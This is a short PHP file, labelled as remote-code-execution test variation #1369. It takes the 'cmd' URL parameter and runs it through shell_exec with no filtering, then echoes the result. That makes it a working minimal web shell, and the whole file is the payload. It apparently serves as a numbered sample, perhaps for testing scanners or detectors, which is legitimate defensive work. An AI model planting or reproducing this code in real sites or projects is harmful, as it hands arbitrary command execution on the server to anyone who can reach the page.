<?php
// RCE test variation #1369
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>